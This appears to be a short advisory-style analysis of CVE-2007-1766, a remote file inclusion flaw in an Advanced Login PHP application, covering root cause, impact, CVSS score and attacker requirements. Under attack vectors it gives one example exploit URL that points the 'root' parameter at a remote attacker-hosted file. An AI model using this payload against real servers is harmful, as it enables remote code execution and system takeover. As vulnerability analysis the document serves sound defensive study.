Based on the provided information, here's an analysis of CVE-2007-1766:

**Root Cause of Vulnerability:**
The vulnerability stems from a lack of proper input validation for the `root` parameter in the `profiledit.php` file of the Advanced Login application.

**Weaknesses/Vulnerabilities Present:**
- **Remote File Inclusion (RFI):** The primary vulnerability is a Remote File Inclusion flaw. The application directly includes a file specified via the `root` parameter without proper sanitization. This allows an attacker to include and execute arbitrary PHP code from a remote server under their control.

**Impact of Exploitation:**
- **Arbitrary Code Execution:** Successful exploitation allows the attacker to execute arbitrary PHP code on the vulnerable server.
- **System Access:** The provided writeup states "Impact: System access" indicating that exploitation of this vulnerability can lead to gaining control of the system.
- **Complete Compromise:** The vulnerability has a CVSS base score of 10/10 with complete impact for Confidentiality, Integrity and Availability indicating a potential for complete system compromise.

**Attack Vectors:**
- **HTTP GET Request:** The vulnerability is triggered through a crafted HTTP GET request, where the attacker provides a malicious URL as the value of the `root` parameter.
  - Example: `http://target.com/login/engine/db/profiledit.php?root==http://attact.com/colok.txt?`

**Required Attacker Capabilities/Position:**
- **Remote Network Access:** The attacker needs to be able to send HTTP requests to the vulnerable server.
- **Malicious Server:** The attacker requires a server hosting malicious PHP code that can be included by the vulnerable application.
- **Knowledge of Vulnerable Parameter:** The attacker needs to know about the vulnerable `root` parameter in `profiledit.php`.
